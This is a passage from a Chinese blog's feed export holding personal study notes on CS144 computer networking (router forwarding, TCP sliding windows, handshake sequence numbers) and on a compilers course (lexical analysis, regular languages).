switch</strong></p><ul><li>Examine the header of each arrving frame</li><li>If the Ethernet DA(Destniation addrdress) is in the forwardingtable, forward the frame to correct output port(s)</li><li>If the Ethernet DA is not in the table, boradcast the frame to allposts</li><li>Entries in the table are learned by examining the Ethernet ofarriving packets.</li></ul><p>Internet Router</p><ul><li><p>If the Ethernet DA of the arriving frame belongs to the router,accept the frame. Else drop it</p></li><li><p>Examine the IP version number and length of the datagram</p></li><li><p>Decrement the TTL, update the IP header checksum.</p></li><li><p>Check to see if TTL == 0</p></li><li><p>if the IP DA is in the forwarding table, forward to the correctegress port(s) for the next hop</p></li><li><p>Find the Ethernet DA for the next hop router</p></li><li><p>Create a new Ethernet frame an d send it</p></li><li><p>Lookup address: How is the address looked up into forwardingtable ?</p></li><li><p>Switching: How is the packet sent to the correct output port?</p></li></ul><p><strong>Lookup address: Ethernet</strong></p><ul><li><p>Methods:</p><ul><li>Store address in hash table (maybe 2-way hash)</li><li>Look for exact match in hash table</li></ul></li></ul><p><strong>Lookup address: IP</strong></p><p>Lookup is a longest prefix match, not an exact match</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172810926.png"alt="image-20230617172810926" /><figcaption aria-hidden="true">image-20230617172810926</figcaption></figure><p>Method 1:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172841236.png"alt="image-20230617172841236" /><figcaption aria-hidden="true">image-20230617172841236</figcaption></figure><p>Method 2:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172919259.png"alt="image-20230617172919259" /><figcaption aria-hidden="true">image-20230617172919259</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172935778.png"alt="image-20230617172935778" /><figcaption aria-hidden="true">image-20230617172935778</figcaption></figure><p>switching packeted to the egress port:</p><ul><li>Output queuing and shared memory</li><li>Inout queuing and head-of-line blocking</li><li>Virtual output queues</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175054605.png"alt="image-20230617175054605" /><figcaption aria-hidden="true">image-20230617175054605</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175119541.png"alt="image-20230617175119541" /><figcaption aria-hidden="true">image-20230617175119541</figcaption></figure><p>但是存在线头阻塞（Head of lineblocking），由于其影响，速率下降了，因为同一时刻，inputqueue内最前面的挡住了后面排队的：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175353059.png"alt="image-20230617175353059" /><figcaption aria-hidden="true">image-20230617175353059</figcaption></figure><p>解决方法：Virtual Output Queue</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175420698.png"alt="image-20230617175420698" /><figcaption aria-hidden="true">image-20230617175420698</figcaption></figure><p>The simplest and slowesr switches uses output queuing, whichminimizes packet delay.</p><p>High performance switches often use iput queuing, with virtual outputqueues to maximize throughput.</p><p>lab 0:</p><p>使用操作系统的TCP和流式socket抽象，基于Internet写一个fetch webpage的程序：</p><ul><li>使用IDE打开../apps/webget.cc</li><li>在ge tURl函数里实现你的代码</li><li>就像该文件里描述的那样，实现一个简单的web客户端（使用http协议）（注：使用<code>TCPSocket</code>and <code>address</code> 这两个类）</li></ul><p>提示：</p><ul><li>Please note that in HTTP, each line must be ended with “” (it’s notsufficient to use just “” or endl).</li><li>Don’t forget to include the “Connection: close” line in yourclient’s request. This tells the server that it shouldn’t wait aroundfor your client to send any more requests after this one. Instead, theserver will send one reply and then will immediately end its outgoingbytestream (the one from the server’s socket to your socket). You’lldiscover that your incoming byte stream has ended because your socketwill reach “EOF” (end of file) when you have read the entire byte streamcoming from the server. That’s how your client will know that the serverhas finished its reply.</li><li>Make sure to read and print all the output from the server until thesocket reaches “EOF” (end of file)—<strong>a single call to read is notenough.</strong>确保读取和打印所有来自服务器的输出，知道socket达到了EOF（文件末尾）</li><li>希望你只用9行代码</li></ul><p>正如上面的<code>TCPSocket</code>类在网络通信中是非常重要的，eventhough the Internet itself only provides the service of “best-effort”(unreliable) datagrams.</p><p>下面将实现一个字节流，已经提供了相关的抽象。</p><p>字节s从input侧写入，并以相同顺序从output侧读取，字节流是有限的writer可以endthe input, 表示没有更多字节写入了。reader一直读，直到遇到了EOF。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络，计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 の 2 TCP Model</title>
    <link href="/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/"/>
    <url>/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="tcp模型">TCP模型</h2><table><thead><tr class="header"><th>性质</th><th>行为</th></tr></thead><tbody><tr class="odd"><td>字节流</td><td>可靠的字节传输服务</td></tr><tr class="even"><td>可靠传输</td><td>确认机制保证了正确有序的传输；checksum检测错误数据，序列号检测丢失数据，滑动窗口式流量控制让值接收方过载；超时和重传机制</td></tr><tr class="odd"><td>有序</td><td>有序同步传输（序列号和确认号机制）</td></tr><tr class="even"><td>用塞控制</td><td></td></tr></tbody></table><p>TCP连接的唯一ID</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[TCP Data src<span class="hljs-built_in"> port </span>, dest port][Ipv4 header,<span class="hljs-built_in"> IP </span>src addr,<span class="hljs-built_in"> IP </span>dest addr, protocol ID = <span class="hljs-string">&#x27;TCP&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般由src port , dest port][Ipv4 header, IP src addr, IP dest addr,protocol ID = 'TCP'组成唯一ID</p><p>Host A increments src port for every new connection</p><p>TCP picks ISN(initial seq number) to avoid overlap with previousconnections with same ID(防止和上一个TCP连接的数据混淆)</p><h2 id="section"></h2><p>TCP如何可靠？</p><p>停止与等待/滑动窗口</p><h2 id="端到端原则">端到端原则</h2><p>为什么Network不做更多的事情：</p><ul><li>压缩数据</li><li>reformat/imporove requests</li><li>Serve cached data</li><li>add security</li><li>Migrate connections across the network</li><li>or one of any of a huge number of other things</li></ul><p>Network仅仅负责传输的事情，不负责其他的，如存储，如果像上面所说，把很多东西都交给了network来做，实际上很多做不到，或者说有缺陷，所以实际实现中，网络的设计应该满足端到端原则，只负责两边的传输相关功能</p><h2 id="finite-state-machine">Finite State Machine</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">state1 =&gt;([event causing <span class="hljs-keyword">state</span> transition | actions taken <span class="hljs-keyword">on</span> <span class="hljs-keyword">state</span> transition]) state2<br><br>state1 =&gt;[event | action] state3<br></code></pre></td></tr></table></figure><h2 id="flow-control">flow control</h2><p>flow control 1：要解决的问题是发送方和接收方速度差异不一致问题</p><ul><li>Stop and wait</li></ul><p>sender: 500, 000 packets/second</p><p>receiver: 200, 000</p><p>如果全速发送，将会丢包40%</p><p>流量控制：不要发送超过接收方可以处理的数据包</p><p>idea：接收方可以发送反馈，这里有两种方式</p><ul><li>停止等待 (其实是window size = 1的滑动窗口)</li><li>滑动窗口</li></ul><p>停止等待：</p><ul><li>任意时间链路中最多仅有一个packet</li><li>发送者每次发送一个</li><li>接收方收到后返回响应</li><li>当接收方收到响应，再次发送新的packet</li><li>一旦超时，重新发送当前数据</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121206723.png"alt="image-20230611121206723" /><figcaption aria-hidden="true">image-20230611121206723</figcaption></figure><p>简单停止等待的🌰：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121246484.png"alt="image-20230611121246484" /><figcaption aria-hidden="true">image-20230611121246484</figcaption></figure><p>case 1: 没有信息丢失</p><p>case 2: req 丢失，timeout 重新发送</p><p>case 3: response 丢失， timeout 重新发送</p><p>case 4: 前面一个丢失的数据报仅仅是delay了，这样就会有重复</p><p><strong>solution:</strong> Use 1-bit counter in data andacknowledgements</p><p>​ Receiver can tell if new data or duplicated</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121527344.png"alt="image-20230611121527344" /><figcaption aria-hidden="true">image-20230611121527344</figcaption></figure><p>这样间隔的数据报counter位是不一样的</p><p>1bit基于两个假设：</p><ul><li>延迟不会超过多个timeout，这样间隔的数据counter位是一样的</li><li>网络本身并复制packet，因为如果发送重复packet，那么前后两个packet本身是一致的，但是由于计数却是不一致的，这样两个packet就会同时存在</li></ul><h2 id="滑动窗口">滑动窗口</h2><p>考虑一个发送数据包的🌰：</p><p>上海 =&gt; 北京</p><p>网络性能上限是 10Mb/s</p><p>RTT = 50ms</p><p>Ethnet的传输速度是12kb/s</p><p>这样1s可以发送20次，总共可以发20 * 12 = 240kb/s</p><p>240kb/s/10Mb/s = 240/10, 000 = 2.4%</p><p>假如使用滑动窗口（这里考虑发送方和接收方窗口大小一致）：我们可以使用一个可以达到新能瓶颈的windowsize</p><p>240 * 42 = 1080，大约48个window size即可充分使用整个网络带宽</p><p>滑动窗口：</p><ul><li>Gerneration of stop-and-wait: allow multiple un-packed segments</li><li>Bound on number of un-packed segments, called window</li><li>Can keep pipe full (充分使用整个网络带宽)</li></ul><p>Sliding window Sender</p><ul><li>窗口内的每个segment都有一个序列号</li><li>发送方维护三个变量<ul><li>send window size(sws)</li><li>Last acknowledgment received (LAR)</li><li>Last segment sent(LSS)</li></ul></li><li>Maintain invariant: (LSS - LAR) &lt;= SWS</li><li>缓存窗口内的segments</li><li>当有新的确认到来，扩张窗口</li></ul><p>Sliding window Receiver</p><ul><li>维护三个变量<ul><li>Receive window size(sws)</li><li>Last acceptable segment (LAS)</li><li>Last segment received(LSR)</li></ul></li><li>Maintain invariant: (LAS - LSR) &lt;= RWS</li><li>如果接受的Packet小于LAS，回复确认</li><li>累计确认：如果收到了1,2,3,5，则回复ack = 3</li></ul><p>比如：RWS=5, LSR = 3, 那么本次将会接收4 ,5 ,6, 7, 8,如果有10，是不会接收的</p><p>RWS, SWS and Seq Space</p><ul><li>RWS &gt;= 1, SWS &gt;= 1, RWS &lt;= SWS</li><li>if RWS = 1, go back N protocol, need SWS + 1 seq numbers</li><li>if RWS = SWS, need 2SWS seq numbers</li><li>Generally need RWS + SWS seq numbers</li></ul><p>TCP流量控制：</p><ul><li>接收方 advertises RWS using window field</li><li>Sender can only send data up to LAR + window</li></ul><p>累计确认：累积确认这个概念应该不只适用于TCP协议，也适用其他层，比如链路层。</p><p>一般地讲，如果发送方发了包1，包2，包3，包4；接受方成功收到包1，包2，包3。那么接受方可以发回一个确认包，序号为4(4表示期望下一个收到的包的序号；当然你约定好用3表示也可以)，那么发送方就知道包1到包3都发送接收成功，必要时重发包4。一个确认包确认了累积到某一序号的所有包，而不是对每个序号都发确认包。</p><p>具体到TCP，它对字节编号。比如发送方发了包1，包2，包3；包1含字节0到10，包2含字节11到20，包3含字节21到30。接受方成功收到包1，包2。那么接受方发回一个包含确认序号21的包，发送方就知道字节0到20(包1，包2)都成功收到，必要时要重发的只需从字节21开始。</p><h2 id="重传策略">重传策略</h2><p>现在已经有了window size的概念，累计确认的概念，每个Packet都有自己的定时器</p><p>如果定时器超时怎么办？</p><ul><li>Go-back-N:一旦一个包丢失了将会重发整个窗口数据，本质上是因为接收方的窗口大小仅仅为1</li><li>选择重传：一旦一个包丢失了只会重发整个窗口数据丢失的那个包</li></ul><p>https://blog.csdn.net/qq_44807642/article/details/103054914https://zhuanlan.zhihu.com/p/589068775https://blog.csdn.net/u011617742/article/details/50387670#:~:text=%E5%9C%A8%E8%BF%94%E5%9B%9EN%E5%8D%8F%E8%AE%AE%E4%B8%AD%EF%BC%8C%E5%8F%91%E9%80%81%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E5%BF%85%E9%A1%BB%3C%3D2m-1%2C%E6%8E%A5%E6%94%B6%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E5%A7%8B%E7%BB%88%E4%B8%BA1%E3%80%82,%E6%9C%AC%E8%B4%A8%E5%B0%B1%E6%98%AF%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E4%B8%8D%E8%83%BD%20%E8%B6%85%E8%BF%87%E5%BA%8F%E5%8F%B7%E8%83%BD%E8%A1%A8%E7%A4%BA%E7%9A%84%E8%8C%83%E5%9B%B4%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%80%E5%A4%A7%E5%BA%8F%E5%8F%B7%E6%98%AF3%EF%BC%8C%E7%AA%97%E5%8F%A3%E6%98%AF6%E7%AA%97%E5%8F%A3%E6%AF%94%E6%9C%80%E5%A4%A7%E5%BA%8F%E5%8F%B7%E5%A4%A7%EF%BC%8C%E4%BC%9A%E5%87%BA%E7%8E%B00%EF%BC%8C1%EF%BC%8C2%2C3%2C0%2C1%E8%BF%99%E6%A0%B7%E7%9A%84%E7%AA%97%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%97%A0%E6%B3%95%E5%88%A4%E6%96%AD%E6%8E%A5%E6%94%B6%E7%AA%97%E5%8F%A3%E8%BF%94%E5%9B%9E%E7%9A%84ACK0%E6%98%AF%E4%BB%A3%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%B8%AA0%E6%94%B6%E5%88%B0%E8%BF%98%E6%98%AF%E7%AC%AC%E4%BA%8C%E4%B8%AA0%E6%94%B6%E5%88%B0%E3%80%82</p><h2 id="tcp-header">TCP header</h2><h2 id="tcp的setup-teardown">TCP的Setup &amp; Teardown</h2><p>可靠的通信依赖于通信双方的状态</p><p>问题是链接建立的时候如何维护这个状态？</p><p>当断连的时候如何清理这些状态？</p><p>Cleaning Up Safely</p><ul><li>Problems with closed socket<ul><li>What if final ack is lost in the network</li><li>What if the same port pair is immediately resued for a newconnection ?</li></ul></li><li>Solution: 'active' closer goes into TIME WAIT<ul><li>Active close is sendingFIN before receving one</li><li>Keep socket around for 2 MSL (twice the 'maximum segmentlifetime')</li></ul></li><li>Can pose problems with servers<ul><li>OS has too many socketd in TIME WAIT, slows things down</li><li>Hack: Can send RST and delete socket, so SO_LINGER socket option totime 0</li><li>OS won't let you re-start server because port still in use(SO_REUSEADDR) option lets you re-bind used port number.</li></ul></li></ul><p><strong>TCP🌰：</strong></p><p>不管是发送方还是接收方都会维护一个序列号（用于同步自己发送的数据）和确认号（用于同步对方的序列号），即使是像建立连接的时候数据段长度为0，但是对应的序列号和确认号也要消耗掉一个序号（即自增）</p><figure><imgsrc="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a437fcc7a69a4ef9b57b34d38a02c2bf~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><p>来看一个🌰：以下都是相对序列号</p><figure><imgsrc="https://img-blog.csdn.net/20160818012008762?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>客户端 =&gt; 服务端: [SYN], seq = 0, len = 0, syn = 1, len = 0(客户端传递seq希望和服务端同步自己的数据,同时消耗掉客户端一个序列号，下一次客户端序列号就是从1开始)</p><p>客户端 &lt;= 服务端: [SYN, ACK] , seq = 0, ack = 1, syn = 1, len = 0(服务端回应同步，传递seq希望和客户端同步自己的数据,同时消耗掉服务端一个序列号, 下一次服务端序列号就是从1开始)</p><p>客户端 =&gt; 服务端: [ACK], ack = 1, seq = 1, len =0(客户端回应同步)</p><p>开始发送数据</p><p>客户端 =&gt; 服务端：[ACK], seq = 1, len = 474, ack =1(ack用于同步对方的消息)</p><p>客户端 &lt;= 服务端：[ACK], seq = 1, ack = 475(ack用于同步对方的消息,表示我已经收到你的前474个数据包)，服务端无响应数据，仅仅是ack数据包</p><p>客户端 &lt;= 服务端：[ACK], seq = 1, ack = 475, len = 1448, next seq= 1449, 是对上一次的客户端请求的一次tcp响应包</p><p>客户端 &lt;= 服务端：[ACK], seq = 1449, ack = 475, len = 1448, nextseq = 2897, 依旧是对上一次的客户端请求的一次tcp响应包</p><p>客户端 &lt;= 服务端：[ACK], seq = 2897, ack = 475, len = 1334, nextseq = 2897 + 1334, 还是对上一次的客户端请求的一次tcp响应包</p><p>上面的序列号是相对的，所以看起来都是从0开始，但是实际上起始序列号是随机的，为什么要初始化起始序列号？</p><ul><li>避免偶然性，防止意外乱入</li><li>安全性，防止恶意插入，因为如果起始序列号是固定的活着容易猜到的，在网络代理中，抓到tcp包，即可插入自己的数据，但是实际上几乎所有代理工具都无法解析道tcp的起始序列号。</li></ul><p>https://www.cnblogs.com/163yun/p/9552368.html</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络，计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 1 Introduction</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><h3 id="compiler-vs-interpreter">Compiler vs Interpreter</h3><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230625222308600.png" alt="image-20230625222308600" style="zoom:50%;" /></p><h3 id="history-of-compiler">History of Compiler</h3><blockquote><p>很喜欢的一句话：</p><p>When hardware cost the most in absolute and relative terms more thanthey would ever cost again already, the software was the dominantexpense. And in making good use out of computers.</p><p>当硬件占据了绝对成本，就该考虑软件了。</p></blockquote><blockquote><p>FORTRAN：</p><p>The first compiler: Huge impact on computer science</p><p>Led to an enormous body of theoretical work</p><p>Modern compilers preserve the outline of FORTRAN</p></blockquote><p>现代编译器一般由以下组成：</p><ul><li>Lexical Analysis</li><li>Parsing</li><li>Semantic Analysis</li><li>Optimization</li><li>Code Genderation</li></ul><p>First Step: recognize words — Smallest unit above letters</p><p>This is a sentence</p><p>Lexical analysis divides program text into "words" or "tokens".</p><p>If x==y then z = 1; else z = 2;</p><p>编译器如何知道第一个双等于不是两个分开的独立的等于号？</p><p>Once words are understood, the next step is to understand sentencestructure</p><p>Parsing = Digramming Sentences — The diagram is a tree</p><p>看一个自然语言的例子</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230625224323367.png"alt="image-20230625224323367" /><figcaption aria-hidden="true">image-20230625224323367</figcaption></figure><p>看一个编程语言的例子:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230625224931669.png"alt="image-20230625224931669" /><figcaption aria-hidden="true">image-20230625224931669</figcaption></figure><p>一旦句子的结构清晰了，就可以尝试去理解它的意思，compilers performlimited semantic analysis to catch inconsistencies.</p><p>🌰：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Jack </span>said <span class="hljs-keyword">Jerry </span>left his assignments <span class="hljs-built_in">at</span> home<br>这个句子里his指代不明确<br><br><span class="hljs-keyword">Jack </span>said <span class="hljs-keyword">Jack </span>left his assignment <span class="hljs-built_in">at</span> home ?<br>这个句子里更糟糕了，his可能指第一个<span class="hljs-keyword">Jack，当然也可能是第二个Jack，还有可能是其他人</span><br></code></pre></td></tr></table></figure><p>类比编程语言：定义了作用域限制了二义性</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&#123;<br>int Jack <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>&#123;<br>int Jack <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>cout &lt;&lt; Jack<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Compiler perform many semantic checks besides bariable bindings</p><p>eg:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Jack </span>said <span class="hljs-keyword">Jerry </span>left her assignments <span class="hljs-built_in">at</span> home<br></code></pre></td></tr></table></figure><p>a tyoe mismatch between her and Jack, we know thet are differentpeople</p><p>优化在自然语言中该户没有对应的部分，但是有点像简写；优化程序的目的是：运行速度更快，使用内存更少</p><p>简写不是随便的：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> Y * <span class="hljs-number">0</span> <span class="hljs-operator">=</span>&gt; X <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>这是不正确的，Y如果是NaN，那么X应该仍然是NaN，而不是<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>代码生成通常指汇编代码生成，有点类型自然语言里的"翻译"</p><p>现代编译器大多是这样的轮廓，只不过各部分所占据的比重不一样，现代编译器更注重优化：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230625230214905.png"alt="image-20230625230214905" /><figcaption aria-hidden="true">image-20230625230214905</figcaption></figure><h2 id="economy-of-编译器">Economy of 编译器</h2><p>Why are there so many programming langs ？</p><p>Why are there new programming langs ？</p><p>Why is a good programming lang ？</p><h3 id="why-are-there-so-many-programming-langs">Why are there so manyprogramming langs ?</h3><p>不同的领域有着不同的语言需求</p><ul><li><p>比如科学计算，需要好的浮点数处理，快速的矩阵运算和并行，代表语言：FORTRAN(formulatranslation,公式翻译)</p></li><li><p>商业应用：需要数据分析和报表，代表语言：sql</p></li><li><p>系统编程：需要实时性，与操作系统打交道，C/C++</p></li></ul><h3 id="why-are-there-new-programming-langs">Why are there newprogramming langs</h3><ul><li>程序员的训练是一门语言的主要成本</li><li>很容易开始一门新的语言</li><li>新的领域产生，新的语言更适用于新的领域</li></ul><h3 id="why-is-a-good-programming-lang">Why is a good programming lang？</h3><p>没有统一的标准去规定哪种语言是最好的语言</p><h2 id="cool语法">Cool语法</h2><p>wip</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 2 Lexical Analysis</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%8C/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">编写代码时：<br>if (i == j)<br>z = 0;<br>else<br>z = 1;<br><br>实际喂给leximal analyzer的:<br><span class="hljs-symbol">\t</span>if (i == i)<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=0;<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span>else<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=1;<br></code></pre></td></tr></table></figure><p>Token Class</p><ul><li><p>In English: Noun, Verb, Adjective</p></li><li><p>In Programming language: Identifier, Keywords, '(', ')'</p></li></ul><p>Token Class correspond to set of strings</p><ul><li><p>[token class]: [set of strings]</p></li><li><p>Identifier: strings of letters or digits, starting with aletter</p></li><li><p>Integer: a non-empty string of digits</p></li><li><p>Keyword: 'else' or 'if'</p></li><li><p>whitespace: a non-empty sequence of blanks, newlines, andtabs</p></li></ul><p>Lexical analyzer的主要功能：</p><ul><li><p>Classify program substrings according to role(TokenClass)</p></li><li><p>Communicate tokens to the parser</p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span> =&gt; LA =&gt; Parser<br>token: &lt;<span class="hljs-keyword">class</span>, <span class="hljs-symbol">string</span>&gt;<br><br><span class="hljs-symbol">foo</span> = <span class="hljs-symbol">42</span> =&gt; &lt;<span class="hljs-symbol">ID, </span>&#x27;<span class="hljs-symbol">foo</span>&#x27;&gt;, &lt;<span class="hljs-symbol">OP, </span>&#x27;=&#x27;&gt;, &lt;<span class="hljs-symbol">INT, </span>&quot;<span class="hljs-symbol">42</span>&quot;&gt;<br></code></pre></td></tr></table></figure><p>An implementation must do two things:</p><ol type="1"><li>Recognize substrings corresponding to tokens(切割成一个个子串(专业名词：词素))</li><li>Identify the token class of each lexeme (为这些子串分配Tokenclass)</li></ol><p>最终形成的就是以下输出：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">tokens: [token1, token2]<br><span class="hljs-keyword">token</span>: &lt;<span class="hljs-keyword">token</span> <span class="hljs-keyword">class</span>, lexeme&gt;<br></code></pre></td></tr></table></figure><h2 id="regular-language">Regular Language</h2><p>正则语言用于规定编程语言的词法结构</p><p>词法结构本质上就是一组token classes</p><p>所以我们必须要定义这样一些规则：什么样的字符串属于某一类tokenclass（这样的规则就是正则表达式）</p><p>比如：</p><p><span class="math inline">\(single \quad character:\{c\}\)</span></p><p><span class="math inline">\(Epsilon: \{&#39;&#39;\}\)</span></p><p><span class="math inline">\(Union: A+B = \{a|a \in A\} \cup \{b|b \inB\}\)</span></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230628232115530.png"alt="image-20230628232115530" /><figcaption aria-hidden="true">image-20230628232115530</figcaption></figure><p>基于字符集sigma的正则表达式集合：</p><p><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230628232258693.png"alt="image-20230628232258693" />这个描述正则表达式的带竖线的语法叫做文法（grammar)</p><p>同一个集合可以由不同的方法表示出来。</p><p>如：1* = 1* + 1，因为1*= {'', 1, 11, 111}, 而1* +1（注意这里的+不是连接的意思，而是并集），{'', 1, 11, 111} U {1} = {'',1, 11, 111},不变</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230628233030413.png"alt="image-20230628233030413" /><figcaption aria-hidden="true">image-20230628233030413</figcaption></figure><h3 id="conclusion">Conclusion：</h3><p>正则表达式指定了正则语言</p><p>正则表达式5个组成部分：</p><ul><li><p>Two base cases: empty and 1-character strings</p></li><li><p>Three compound expressions: union concatenatation anditeration</p></li></ul><h2 id="形式语言">形式语言：</h2><p><ahref="https://zhuanlan.zhihu.com/p/47583941">形式语言与自动机——形式语言- 知乎 (zhihu.com)</a></p><p><ahref="https://blog.csdn.net/hencoff/article/details/7515047">(163条消息)自然语言和形式语言 （包含各种术语的区别）_Hencoff的博客-CSDN博客</a></p><p>定义：let <span class="math inline">\(\Sigma\)</span> be a set ofcharacters (an alphabet)</p><p>A language over <span class="math inline">\(\Sigma\)</span> is a setof strings of characters drawn from <spanclass="math inline">\(\Sigma\)</span></p><p>简而言之，所以形式语言其实就是字符集上的任何一组字符串，正则表达式是形式语言的一种</p><p>如：alphabet：英文字符</p><p>lang: 英语句子</p><p>上面的例子不是，因为英文单词的定义是没有规则的</p><p>如：alphabet：ascii</p><p>language: C program</p><p><strong>映射函数</strong>：L maps syntax to semantics</p><p><span class="math inline">\(L(e) = M\)</span></p><p><span class="math inline">\(e =&gt; re(regular \quadexpression)\)</span></p><p><span class="math inline">\(M =&gt; set \quad of \quadstrings\)</span></p><p>实际上之前的</p><p><span class="math inline">\(A+B = A \cup B就是这样一套map函数，其本质上就是：L(A+B) = L(A) \cup \L(B)\)</span></p><p>Why use a meaning function ?</p><ul><li>划分了syntax和semantics</li><li>可以把notation作为一个独立的问题</li><li>因为表达式(文法)和meanings并不是一对一的关系(可能是多对一，但不会是一对多，这样会出现二义性)</li></ul><h2 id="lexical-specification">Lexical specification</h2><p>Keyword: 'if' or 'else' or 'then'</p><p>Integar: digit = '0' + '1' + ... + '9', digit digit* = digit+</p><p>identifier: letter = [a-zA-Z], letter(letter+digit)*</p><p>Whitespace: (' ' + '' + ')+</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230629233242362.png"alt="image-20230629233242362" /><figcaption aria-hidden="true">image-20230629233242362</figcaption></figure><p>正则表达式描述了许多常规语言，如电话号码，邮件等等</p><p>regular languages are a language specification:正则语言描述了一些符合特定规则的语言</p><p>Given a string s and a rexp R, is <span class="math inline">\(s \inL(R)?\)</span></p><p>为了回答上面这个问题，我们来整理下：</p><h3 id="一些基本的正则表达式">一些基本的正则表达式</h3><p>At least one: $ A+ AA*$</p><p>Union: $ A|B 